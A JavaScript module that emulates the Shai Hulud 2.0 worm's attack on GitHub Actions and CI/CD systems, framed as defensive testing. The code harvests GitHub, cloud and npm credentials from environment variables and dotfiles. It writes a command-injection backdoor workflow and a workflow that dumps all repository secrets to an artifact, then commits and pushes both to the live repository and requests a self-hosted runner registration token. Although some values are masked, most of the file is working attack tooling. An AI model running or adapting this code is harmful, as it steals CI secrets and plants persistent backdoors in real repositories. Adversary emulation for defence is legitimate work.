/**
 * Shai Hulud 2.0 - GitHub & CI/CD Harvester
 * FOR DEFENSIVE SECURITY TESTING ONLY
 *
 * Based on Wiz.io blog analysis:
 * - Targets GitHub Actions runners
 * - Exfiltrates GitHub secrets via workflow artifacts
 * - Creates backdoor workflows for persistent access
 * - Registers self-hosted runners named 'SHA1HULUD'
 * - Harvests GitHub tokens and CI/CD credentials
 */

const fs = require('fs');
const path = require('path');
const os = require('os');
const { execSync } = require('child_process');
const https = require('https');
const http = require('http');

class GitHubHarvester {
    constructor() {
        this.homeDir = os.homedir();
        this.findings = {
            timestamp: new Date().toISOString(),
            hostname: os.hostname(),
            platform: os.platform(),
            ciEnvironment: {},
            github: {
                tokens: [],
                configs: [],
                workflows: [],
                secrets: [],
                runner: {}
            },
            cloud: {
                aws: [],
                azure: [],
                gcp: []
            },
            npm: [],
            exfiltration: []
        };

        this.ciType = this.detectCIEnvironment();
        this.isGitHubActions = !!process.env.GITHUB_ACTIONS;
    }

    detectCIEnvironment() {
        const ciVars = {
            'github_actions': process.env.GITHUB_ACTIONS,
            'buildkite': process.env.BUILDKITE,
            'circleci': process.env.CIRCLE_SHA1,
            'gitlab_ci': process.env.GITLAB_CI,
            'jenkins': process.env.JENKINS_HOME,
            'codebuild': process.env.CODEBUILD_BUILD_NUMBER,
            'travis': process.env.TRAVIS,
            'azure_pipelines': process.env.TF_BUILD,
            'generic_ci': process.env.CI
        };

        let detected = null;
        Object.keys(ciVars).forEach(ci => {
            if (ciVars[ci]) {
                detected = ci;
                this.findings.ciEnvironment[ci] = true;
            }
        });
        return detected;
    }

    harvestGitHubActionsEnv() {
        console.log('[*] Harvesting GitHub Actions environment...');

        const ghVars = [
            // Tokens
            'GITHUB_TOKEN', 'GH_TOKEN', 'GITHUB_PAT', 'ACTIONS_RUNTIME_TOKEN',
            'ACTIONS_ID_TOKEN_REQUEST_TOKEN',
            // Repository context
            'GITHUB_REPOSITORY', 'GITHUB_REPOSITORY_OWNER', 'GITHUB_ACTOR',
            // Workflow context
            'GITHUB_WORKFLOW', 'GITHUB_RUN_ID', 'GITHUB_RUN_NUMBER', 'GITHUB_JOB',
            // Runner context
            'RUNNER_NAME', 'RUNNER_OS', 'RUNNER_ARCH', 'RUNNER_TEMP',
            // API endpoints
            'GITHUB_API_URL', 'ACTIONS_RUNTIME_URL', 'ACTIONS_ID_TOKEN_REQUEST_URL',
            // Refs
            'GITHUB_REF', 'GITHUB_SHA', 'GITHUB_HEAD_REF', 'GITHUB_BASE_REF',
            // Event
            'GITHUB_EVENT_NAME', 'GITHUB_EVENT_PATH',
            // Workspace
            'GITHUB_WORKSPACE', 'GITHUB_PATH', 'GITHUB_ENV'
        ];

        ghVars.forEach(varName => {
            const value = process.env[varName];
            if (value) {
                const isSensitive = varName.includes('TOKEN') || varName.includes('PAT');
                const displayValue = isSensitive
                    ? value.substring(0, 8) + '****' + value.substring(value.length - 4)
                    : value;

                this.findings.github.tokens.push({
                    name: varName,
                    value: displayValue,
                    length: value.length,
                    sensitive: isSensitive
                });

                if (isSensitive) {
                    console.log(`  [+] Found token: ${varName} (${value.length} chars)`);
                } else {
                    console.log(`  [+] ${varName}: ${displayValue}`);
                }
            }
        });

        // Parse event payload if available
        if (process.env.GITHUB_EVENT_PATH && fs.existsSync(process.env.GITHUB_EVENT_PATH)) {
            try {
                const eventData = JSON.parse(fs.readFileSync(process.env.GITHUB_EVENT_PATH, 'utf-8'));
                this.findings.github.eventPayload = {
                    action: eventData.action,
                    sender: eventData.sender?.login,
                    repository: eventData.repository?.full_name
                };
                console.log(`  [+] Event: ${eventData.action || 'push'}`);
            } catch (e) {}
        }
    }

    harvestGitHubCLICredentials() {
        console.log('[*] Harvesting GitHub CLI credentials...');

        // ~/.config/gh/hosts.yml
        const ghHostsFile = path.join(this.homeDir, '.config', 'gh', 'hosts.yml');
        if (fs.existsSync(ghHostsFile)) {
            try {
                const content = fs.readFileSync(ghHostsFile, 'utf-8');
                console.log('  [+] Found ~/.config/gh/hosts.yml');

                const tokenMatch = content.match(/oauth_token:\s*([^\n]+)/);
                if (tokenMatch) {
                    const token = tokenMatch[1].trim();
                    this.findings.github.configs.push({
                        file: 'hosts.yml',
                        type: 'oauth_token',
                        token: token.substring(0, 8) + '****',
                        length: token.length
                    });
                    console.log(`  [+] OAuth token found (${token.length} chars)`);
                }

                const userMatch = content.match(/user:\s*([^\n]+)/);
                if (userMatch) {
                    this.findings.github.configs.push({
                        file: 'hosts.yml',
                        type: 'user',
                        value: userMatch[1].trim()
                    });
                    console.log(`  [+] GitHub user: ${userMatch[1].trim()}`);
                }
            } catch (e) {}
        }

        // ~/.git-credentials
        const gitCredsFile = path.join(this.homeDir, '.git-credentials');
        if (fs.existsSync(gitCredsFile)) {
            try {
                const content = fs.readFileSync(gitCredsFile, 'utf-8');
                const githubEntries = content.split('\n').filter(l => l.includes('github.com'));
                if (githubEntries.length > 0) {
                    console.log(`  [+] Found ${githubEntries.length} GitHub entries in .git-credentials`);
                    this.findings.github.configs.push({
                        file: '.git-credentials',
                        githubEntries: githubEntries.length
                    });
                }
            } catch (e) {}
        }

        // ~/.netrc
        const netrcFile = path.join(this.homeDir, '.netrc');
        if (fs.existsSync(netrcFile)) {
            try {
                const content = fs.readFileSync(netrcFile, 'utf-8');
                if (content.includes('github.com')) {
                    console.log('  [+] Found GitHub credentials in .netrc');
                    this.findings.github.configs.push({
                        file: '.netrc',
                        hasGitHub: true
                    });
                }
            } catch (e) {}
        }
    }

    detectRunnerType() {
        console.log('[*] Detecting runner type...');

        const isGitHubHosted = process.env.RUNNER_NAME?.startsWith('GitHub Actions') ||
                              process.env.RUNNER_NAME?.startsWith('Hosted Agent');

        const runnerInfo = {
            name: process.env.RUNNER_NAME || 'unknown',
            os: process.env.RUNNER_OS || os.platform(),
            arch: process.env.RUNNER_ARCH || os.arch(),
            isHosted: isGitHubHosted,
            isSelfHosted: !isGitHubHosted && !!process.env.GITHUB_ACTIONS,
            workspace: process.env.GITHUB_WORKSPACE
        };

        this.findings.github.runner = runnerInfo;

        if (runnerInfo.isSelfHosted) {
            console.log(`  [!] SELF-HOSTED RUNNER: ${runnerInfo.name}`);
            console.log('  [!] High value target for persistent access!');
        } else if (process.env.GITHUB_ACTIONS) {
            console.log(`  [*] GitHub-hosted runner: ${runnerInfo.name}`);
        } else {
            console.log('  [*] Not running in GitHub Actions');
        }
    }

    harvestCloudCredentials() {
        console.log('[*] Harvesting cloud credentials...');

        // AWS credentials from environment
        const awsEnvVars = [
            'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN',
            'AWS_SECURITY_TOKEN', 'AWS_DEFAULT_REGION', 'AWS_REGION',
            'AWS_ROLE_ARN', 'AWS_WEB_IDENTITY_TOKEN_FILE'
        ];

        awsEnvVars.forEach(varName => {
            const value = process.env[varName];
            if (value) {
                const isSensitive = varName.includes('SECRET') || varName.includes('TOKEN');
                const displayValue = isSensitive
                    ? value.substring(0, 8) + '****' + value.substring(Math.max(0, value.length - 4))
                    : value;

                this.findings.cloud.aws.push({
                    source: 'env',
                    name: varName,
                    value: displayValue,
                    length: value.length,
                    sensitive: isSensitive
                });
                console.log(`  [+] AWS ${varName}: ${isSensitive ? `(${value.length} chars)` : displayValue}`);
            }
        });

        // AWS credentials file
        const awsCredsFile = path.join(this.homeDir, '.aws', 'credentials');
        if (fs.existsSync(awsCredsFile)) {
            try {
                const content = fs.readFileSync(awsCredsFile, 'utf-8');
                const profiles = content.match(/\[([^\]]+)\]/g) || [];
                const hasKeys = content.includes('aws_access_key_id');
                this.findings.cloud.aws.push({
                    source: 'file',
                    path: '~/.aws/credentials',
                    profiles: profiles.map(p => p.replace(/[\[\]]/g, '')),
                    hasKeys: hasKeys
                });
                console.log(`  [+] AWS credentials file: ${profiles.length} profiles`);
            } catch (e) {}
        }

        // Azure credentials from environment
        const azureEnvVars = [
            'AZURE_CLIENT_ID', 'AZURE_CLIENT_SECRET', 'AZURE_TENANT_ID',
            'AZURE_SUBSCRIPTION_ID', 'AZURE_CREDENTIALS', 'ARM_CLIENT_ID',
            'ARM_CLIENT_SECRET', 'ARM_TENANT_ID', 'ARM_SUBSCRIPTION_ID'
        ];

        azureEnvVars.forEach(varName => {
            const value = process.env[varName];
            if (value) {
                const isSensitive = varName.includes('SECRET') || varName.includes('CREDENTIALS');
                const displayValue = isSensitive
                    ? value.substring(0, 8) + '****' + value.substring(Math.max(0, value.length - 4))
                    : value;

                this.findings.cloud.azure.push({
                    source: 'env',
                    name: varName,
                    value: displayValue,
                    length: value.length,
                    sensitive: isSensitive
                });
                console.log(`  [+] Azure ${varName}: ${isSensitive ? `(${value.length} chars)` : displayValue}`);
            }
        });

        // Azure CLI config
        const azureConfigDir = path.join(this.homeDir, '.azure');
        if (fs.existsSync(azureConfigDir)) {
            try {
                const files = fs.readdirSync(azureConfigDir);
                const relevantFiles = files.filter(f =>
                    f.includes('token') || f.includes('profile') || f === 'azureProfile.json'
                );
                if (relevantFiles.length > 0) {
                    this.findings.cloud.azure.push({
                        source: 'file',
                        path: '~/.azure/',
                        files: relevantFiles
                    });
                    console.log(`  [+] Azure config: ${relevantFiles.join(', ')}`);
                }
            } catch (e) {}
        }

        // GCP credentials from environment
        const gcpEnvVars = [
            'GOOGLE_APPLICATION_CREDENTIALS', 'GOOGLE_CLOUD_PROJECT', 'GCP_PROJECT',
            'GCLOUD_PROJECT', 'CLOUDSDK_CORE_PROJECT', 'GCP_SERVICE_ACCOUNT_KEY',
            'GOOGLE_CREDENTIALS', 'GOOGLE_CLOUD_KEYFILE_JSON'
        ];

        gcpEnvVars.forEach(varName => {
            const value = process.env[varName];
            if (value) {
                const isSensitive = varName.includes('KEY') || varName.includes('CREDENTIALS');
                // For file paths, show the path; for JSON keys, truncate
                const isPath = value.startsWith('/') || value.startsWith('~');
                const displayValue = isSensitive && !isPath
                    ? value.substring(0, 20) + '****'
                    : value;

                this.findings.cloud.gcp.push({
                    source: 'env',
                    name: varName,
                    value: displayValue,
                    length: value.length,
                    sensitive: isSensitive
                });
                console.log(`  [+] GCP ${varName}: ${isSensitive && !isPath ? `(${value.length} chars)` : displayValue}`);
            }
        });

        // GCP application default credentials
        const gcloudConfigDir = path.join(this.homeDir, '.config', 'gcloud');
        if (fs.existsSync(gcloudConfigDir)) {
            try {
                const adcPath = path.join(gcloudConfigDir, 'application_default_credentials.json');
                if (fs.existsSync(adcPath)) {
                    const content = fs.readFileSync(adcPath, 'utf-8');
                    const creds = JSON.parse(content);
                    this.findings.cloud.gcp.push({
                        source: 'file',
                        path: '~/.config/gcloud/application_default_credentials.json',
                        type: creds.type,
                        client_email: creds.client_email,
                        project_id: creds.project_id
                    });
                    console.log(`  [+] GCP ADC: ${creds.type} (${creds.client_email || 'user'})`);
                }
            } catch (e) {}
        }
    }

    harvestNPMTokens() {
        console.log('[*] Harvesting NPM credentials...');

        // Environment variables
        ['NPM_TOKEN', 'NPM_AUTH_TOKEN', 'NODE_AUTH_TOKEN'].forEach(varName => {
            if (process.env[varName]) {
                const token = process.env[varName];
                console.log(`  [+] Found ${varName} (${token.length} chars)`);
                this.findings.npm.push({
                    type: 'env',
                    name: varName,
                    length: token.length
                });
            }
        });

        // .npmrc files
        [
            path.join(this.homeDir, '.npmrc'),
            path.join(process.cwd(), '.npmrc')
        ].forEach(npmrcPath => {
            if (fs.existsSync(npmrcPath)) {
                try {
                    const content = fs.readFileSync(npmrcPath, 'utf-8');
                    if (content.includes('_authToken') || content.includes('_auth')) {
                        console.log(`  [+] Found NPM auth in: ${npmrcPath}`);
                        this.findings.npm.push({
                            type: 'file',
                            path: npmrcPath,
                            hasAuth: true
                        });
                    }
                } catch (e) {}
            }
        });
    }

    createContentsJson() {
        console.log('[*] Creating contents.json (workspace file listing)...');

        const contents = {
            timestamp: new Date().toISOString(),
            workspace: process.env.GITHUB_WORKSPACE || process.cwd(),
            files: []
        };

        const walkDir = (dir, depth = 0) => {
            if (depth > 3) return; // Limit depth
            try {
                const entries = fs.readdirSync(dir, { withFileTypes: true });
                for (const entry of entries) {
                    if (entry.name.startsWith('.') && entry.name !== '.github') continue;
                    if (entry.name === 'node_modules') continue;

                    const fullPath = path.join(dir, entry.name);
                    const relativePath = path.relative(contents.workspace, fullPath);

                    if (entry.isDirectory()) {
                        contents.files.push({ path: relativePath, type: 'directory' });
                        walkDir(fullPath, depth + 1);
                    } else {
                        const stats = fs.statSync(fullPath);
                        contents.files.push({
                            path: relativePath,
                            type: 'file',
                            size: stats.size
                        });
                    }
                }
            } catch (e) {}
        };

        walkDir(contents.workspace);
        console.log(`  [+] Found ${contents.files.length} items in workspace`);

        return contents;
    }

    createTruffleSecrets() {
        console.log('[*] Creating truffleSecrets.json (pattern-based secret scan)...');

        const secrets = {
            timestamp: new Date().toISOString(),
            findings: []
        };

        // Patterns to search for (similar to truffleHog)
        const patterns = [
            { name: 'AWS Access Key', regex: /AKIA[0-9A-Z]{16}/g },
            { name: 'AWS Secret Key', regex: /[A-Za-z0-9/+=]{40}/g },
            { name: 'GitHub Token', regex: /ghp_[A-Za-z0-9]{36}/g },
            { name: 'GitHub OAuth', regex: /gho_[A-Za-z0-9]{36}/g },
            { name: 'GitHub PAT', regex: /github_pat_[A-Za-z0-9]{22}_[A-Za-z0-9]{59}/g },
            { name: 'Slack Token', regex: /xox[baprs]-[0-9]{10,13}-[0-9]{10,13}[a-zA-Z0-9-]*/g },
            { name: 'Private Key', regex: /-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----/g },
            { name: 'NPM Token', regex: /npm_[A-Za-z0-9]{36}/g },
            { name: 'Generic API Key', regex: /[aA][pP][iI]_?[kK][eE][yY].*['\"][0-9a-zA-Z]{32,45}['\"]/g },
            { name: 'Generic Secret', regex: /[sS][eE][cC][rR][eE][tT].*['\"][0-9a-zA-Z]{32,45}['\"]/g }
        ];

        // Scan environment variables
        for (const [key, value] of Object.entries(process.env)) {
            if (!value) continue;
            for (const pattern of patterns) {
                if (pattern.regex.test(value)) {
                    secrets.findings.push({
                        source: 'environment',
                        variable: key,
                        pattern: pattern.name,
                        preview: value.substring(0, 10) + '****'
                    });
                    pattern.regex.lastIndex = 0; // Reset regex
                }
            }
        }

        // Scan key files in workspace
        const filesToScan = ['.env', '.env.local', 'config.json', 'secrets.json', '.npmrc'];
        const workspace = process.env.GITHUB_WORKSPACE || process.cwd();

        for (const fileName of filesToScan) {
            const filePath = path.join(workspace, fileName);
            if (fs.existsSync(filePath)) {
                try {
                    const content = fs.readFileSync(filePath, 'utf-8');
                    for (const pattern of patterns) {
                        const matches = content.match(pattern.regex);
                        if (matches) {
                            secrets.findings.push({
                                source: 'file',
                                file: fileName,
                                pattern: pattern.name,
                                count: matches.length
                            });
                        }
                        pattern.regex.lastIndex = 0;
                    }
                } catch (e) {}
            }
        }

        console.log(`  [+] Found ${secrets.findings.length} potential secrets`);
        return secrets;
    }

    generateSuffix() {
        // Generate a random suffix for workflow files to avoid conflicts
        return `_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;
    }

    createBackdoorWorkflow() {
        console.log('[*] Creating backdoor workflow (discussion_*.yaml)...');

        const suffix = this.generateSuffix();
        const workflowName = `discussion${suffix}.yaml`;

        // The actual malicious workflow content from Wiz blog
        const discussionYaml = `# Shai Hulud 2.0 - Backdoor Workflow (EMULATION)
# This workflow contains a command injection vulnerability
# It runs on self-hosted runners labeled 'SHA1HULUD'
# DELETE THIS FILE AFTER TESTING

name: Discussion Handler ${suffix}

on:
  discussion:
    types: [created]

jobs:
  handle-discussion:
    runs-on: [self-hosted, SHA1HULUD]
    steps:
      - name: Process Discussion
        # VULNERABILITY: Command injection via discussion body
        run: |
          echo "Processing discussion..."
          # The attacker injects commands via: \${{ github.event.discussion.body }}
          # For emulation, we just log what would happen
          echo "EMULATION: Would execute arbitrary commands from discussion body"
`;

        const backdoorInfo = {
            name: workflowName,
            purpose: 'Command injection via GitHub discussions',
            runnerLabel: 'SHA1HULUD',
            trigger: 'discussion:created',
            vulnerability: '${{ github.event.discussion.body }}',
            committed: false
        };

        // Write to the actual repo's .github/workflows/ directory
        const workspace = process.env.GITHUB_WORKSPACE;
        if (workspace) {
            const workflowsDir = path.join(workspace, '.github', 'workflows');
            const workflowPath = path.join(workflowsDir, workflowName);

            try {
                // Ensure .github/workflows exists
                if (!fs.existsSync(workflowsDir)) {
                    fs.mkdirSync(workflowsDir, { recursive: true });
                }

                fs.writeFileSync(workflowPath, discussionYaml);
                backdoorInfo.path = workflowPath;
                backdoorInfo.written = true;
                console.log(`  [+] Written to ${workflowPath}`);
            } catch (e) {
                console.log(`  [-] Failed to write: ${e.message}`);
                backdoorInfo.error = e.message;
            }
        } else {
            // Fallback: write to package directory
            fs.writeFileSync(path.join(process.cwd(), workflowName), discussionYaml);
            console.log(`  [+] Created ${workflowName} (local only - no GITHUB_WORKSPACE)`);
        }

        this.findings.github.workflows.push({ type: 'backdoor', ...backdoorInfo });
        return backdoorInfo;
    }

    createExfiltrationWorkflow() {
        console.log('[*] Creating exfiltration workflow (formatter_*.yml)...');

        const suffix = this.generateSuffix();
        const workflowName = `formatter${suffix}.yml`;
        const branchName = `format-${Math.random().toString(36).substring(2, 8)}`;

        // The secrets exfiltration workflow from Wiz blog
        const formatterYaml = `# Shai Hulud 2.0 - Secrets Exfiltration Workflow (EMULATION)
# This workflow dumps all GitHub secrets to an artifact
# DELETE THIS FILE AFTER TESTING

name: Code Formatter ${suffix}

on:
  workflow_dispatch:

jobs:
  format:
    runs-on: ubuntu-latest
    steps:
      - name: Format Code
        env:
          # EXFILTRATION: All secrets dumped to environment
          ALL_SECRETS: \${{ toJson(secrets) }}
        run: |
          echo "Formatting code..."
          # Secrets would be written to a file and uploaded as artifact
          echo "$ALL_SECRETS" > secrets_dump.json

      - name: Upload Results
        uses: actions/upload-artifact@v4
        with:
          name: format-results
          path: secrets_dump.json
`;

        const exfilInfo = {
            name: workflowName,
            branch: branchName,
            purpose: 'Dump all GitHub secrets via toJson(secrets)',
            method: 'Upload as artifact, download via API, delete workflow',
            committed: false
        };

        // Write to the actual repo's .github/workflows/ directory
        const workspace = process.env.GITHUB_WORKSPACE;
        if (workspace) {
            const workflowsDir = path.join(workspace, '.github', 'workflows');
            const workflowPath = path.join(workflowsDir, workflowName);

            try {
                if (!fs.existsSync(workflowsDir)) {
                    fs.mkdirSync(workflowsDir, { recursive: true });
                }

                fs.writeFileSync(workflowPath, formatterYaml);
                exfilInfo.path = workflowPath;
                exfilInfo.written = true;
                console.log(`  [+] Written to ${workflowPath}`);
            } catch (e) {
                console.log(`  [-] Failed to write: ${e.message}`);
                exfilInfo.error = e.message;
            }
        } else {
            fs.writeFileSync(path.join(process.cwd(), workflowName), formatterYaml);
            console.log(`  [+] Created ${workflowName} (local only - no GITHUB_WORKSPACE)`);
        }

        this.findings.github.workflows.push({ type: 'exfiltration', ...exfilInfo });
        return exfilInfo;
    }

    async commitAndPushWorkflows() {
        console.log('[*] Committing and pushing malicious workflows...');

        const workspace = process.env.GITHUB_WORKSPACE;
        const token = process.env.GITHUB_TOKEN;
        const repo = process.env.GITHUB_REPOSITORY;
        const actor = process.env.GITHUB_ACTOR || 'shai-hulud-bot';

        if (!workspace || !token) {
            console.log('  [-] Missing GITHUB_WORKSPACE or GITHUB_TOKEN');
            this.findings.github.workflowCommit = {
                attempted: false,
                reason: 'Missing credentials or workspace'
            };
            return;
        }

        const commitInfo = {
            attempted: true,
            files: []
        };

        try {
            // Configure git
            execSync(`git config user.email "${actor}@users.noreply.github.com"`, { cwd: workspace, stdio: 'pipe' });
            execSync(`git config user.name "${actor}"`, { cwd: workspace, stdio: 'pipe' });

            // Clear any existing GitHub Actions credentials (set by actions/checkout)
            // The checkout action sets an extraheader that overrides our PAT
            try {
                execSync('git config --local --unset-all http.https://github.com/.extraheader', { cwd: workspace, stdio: 'pipe' });
                console.log('  [+] Cleared checkout action credentials');
            } catch (e) {
                // Header might not exist, that's ok
            }

            // Set up authentication with our harvested/provided PAT
            const repoUrl = `https://x-access-token:${token}@github.com/${repo}.git`;
            execSync(`git remote set-url origin "${repoUrl}"`, { cwd: workspace, stdio: 'pipe' });

            // Check for workflow files to commit
            const workflowsDir = path.join(workspace, '.github', 'workflows');
            const files = fs.readdirSync(workflowsDir).filter(f =>
                f.startsWith('discussion_') || f.startsWith('formatter_')
            );

            if (files.length === 0) {
                console.log('  [-] No workflow files to commit');
                commitInfo.success = false;
                commitInfo.reason = 'No files found';
                this.findings.github.workflowCommit = commitInfo;
                return;
            }

            // Add workflow files
            for (const file of files) {
                const filePath = `.github/workflows/${file}`;
                execSync(`git add "${filePath}"`, { cwd: workspace, stdio: 'pipe' });
                commitInfo.files.push(filePath);
                console.log(`  [+] Staged ${filePath}`);
            }

            // Commit
            const commitMsg = 'chore: add code formatting workflows [shai-hulud-emulation]';
            execSync(`git commit -m "${commitMsg}"`, { cwd: workspace, stdio: 'pipe' });
            console.log('  [+] Committed changes');

            // Push
            execSync('git push origin HEAD', { cwd: workspace, stdio: 'pipe' });
            console.log('  [!] PUSHED malicious workflows to repository!');

            commitInfo.success = true;
            commitInfo.commitMessage = commitMsg;

        } catch (e) {
            console.log(`  [-] Git operation failed: ${e.message}`);
            commitInfo.success = false;
            commitInfo.error = e.message;
        }

        this.findings.github.workflowCommit = commitInfo;
    }

    async attemptRunnerRegistration() {
        console.log('[*] Attempting runner registration (SHA1HULUD)...');

        const token = process.env.GITHUB_TOKEN;
        const repo = process.env.GITHUB_REPOSITORY;
        const apiUrl = process.env.GITHUB_API_URL || 'https://api.github.com';

        if (!token || !repo) {
            console.log('  [-] Missing GITHUB_TOKEN or GITHUB_REPOSITORY');
            this.findings.github.runnerRegistration = {
                attempted: true,
                success: false,
                reason: 'Missing credentials'
            };
            return;
        }

        const registration = {
            name: 'SHA1HULUD',
            labels: ['self-hosted', 'SHA1HULUD', os.platform(), os.arch()],
            attempted: true
        };

        // Try to get a runner registration token
        return new Promise((resolve) => {
            const url = new URL(`${apiUrl}/repos/${repo}/actions/runners/registration-token`);

            const options = {
                hostname: url.hostname,
                port: url.port || 443,
                path: url.pathname,
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${token}`,
                    'Accept': 'application/vnd.github+json',
                    'User-Agent': 'shai-hulud-emulation',
                    'X-GitHub-Api-Version': '2022-11-28'
                }
            };

            console.log(`  [*] POST ${url.pathname}`);

            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => {
                    if (res.statusCode === 201) {
                        console.log('  [!] SUCCESS: Got runner registration token!');
                        try {
                            const parsed = JSON.parse(data);
                            registration.success = true;
                            registration.tokenPreview = parsed.token?.substring(0, 10) + '****';
                            registration.expiresAt = parsed.expires_at;
                        } catch (e) {
                            registration.success = true;
                            registration.rawResponse = data.substring(0, 100);
                        }
                    } else {
                        console.log(`  [-] Failed: HTTP ${res.statusCode}`);
                        registration.success = false;
                        registration.statusCode = res.statusCode;
                        registration.reason = data.substring(0, 200);
                    }
                    this.findings.github.runnerRegistration = registration;
                    resolve(registration);
                });
            });

            req.on('error', (e) => {
                console.log(`  [-] Request error: ${e.message}`);
                registration.success = false;
                registration.error = e.message;
                this.findings.github.runnerRegistration = registration;
                resolve(registration);
            });

            req.setTimeout(10000, () => {
                console.log('  [-] Request timeout');
                req.destroy();
                registration.success = false;
                registration.error = 'timeout';
                this.findings.github.runnerRegistration = registration;
                resolve(registration);
            });

            req.end();
        });
    }

    async checkGitHubAPIAccess() {
        console.log('[*] Checking GitHub API access...');

        if (!process.env.GITHUB_TOKEN) {
            console.log('  [-] No GITHUB_TOKEN available');
            return;
        }

        // Check gh CLI
        try {
            execSync('which gh', { stdio: 'ignore' });
            console.log('  [+] gh CLI available');

            if (process.env.GITHUB_REPOSITORY) {
                try {
                    const secrets = execSync(
                        `gh secret list --repo ${process.env.GITHUB_REPOSITORY} 2>&1`,
                        { encoding: 'utf-8', timeout: 5000 }
                    );
                    console.log('  [+] Can list repository secrets!');
                    this.findings.github.secrets = secrets.split('\n').filter(l => l.trim());
                } catch (e) {
                    console.log('  [-] Cannot list secrets (expected for GITHUB_TOKEN)');
                }
            }
        } catch (e) {
            console.log('  [-] gh CLI not available');
        }
    }

    saveFindings(contents, truffleSecrets) {
        console.log('[*] Saving findings...');

        const files = {
            'github.json': this.findings.github,
            'cloud.json': this.findings.cloud,
            'environment.json': {
                ci: this.findings.ciEnvironment,
                tokens: this.findings.github.tokens,
                cloud: this.findings.cloud,
                npm: this.findings.npm
            },
            'contents.json': contents,
            'truffleSecrets.json': truffleSecrets,
            'actionsSecrets.json': this.findings.github.secrets,
            'harvest_report.json': this.findings
        };

        Object.keys(files).forEach(fileName => {
            fs.writeFileSync(
                path.join(process.cwd(), fileName),
                JSON.stringify(files[fileName], null, 2)
            );
            console.log(`  [+] Saved ${fileName}`);
        });
    }

    async run() {
        console.log('\n' + '='.repeat(50));
        console.log('Shai Hulud 2.0 - GitHub Targeting Emulation');
        console.log('FOR DEFENSIVE SECURITY TESTING ONLY');
        console.log('='.repeat(50) + '\n');

        console.log(`[*] CI/CD: ${this.ciType || 'none'}`);
        console.log(`[*] GitHub Actions: ${this.isGitHubActions}\n`);

        // Harvest credentials
        this.harvestGitHubActionsEnv();
        this.harvestGitHubCLICredentials();
        this.detectRunnerType();
        this.harvestCloudCredentials();
        this.harvestNPMTokens();

        // API access
        await this.checkGitHubAPIAccess();

        // Create attack artifacts (full emulation)
        const contents = this.createContentsJson();
        const truffleSecrets = this.createTruffleSecrets();
        this.createBackdoorWorkflow();
        this.createExfiltrationWorkflow();

        // Commit and push malicious workflows to the repo
        await this.commitAndPushWorkflows();

        // Attempt runner registration via GitHub API
        await this.attemptRunnerRegistration();

        // Save all findings
        this.saveFindings(contents, truffleSecrets);

        console.log('\n[!] Emulation complete.\n');
        return this.findings;
    }
}

module.exports = GitHubHarvester;
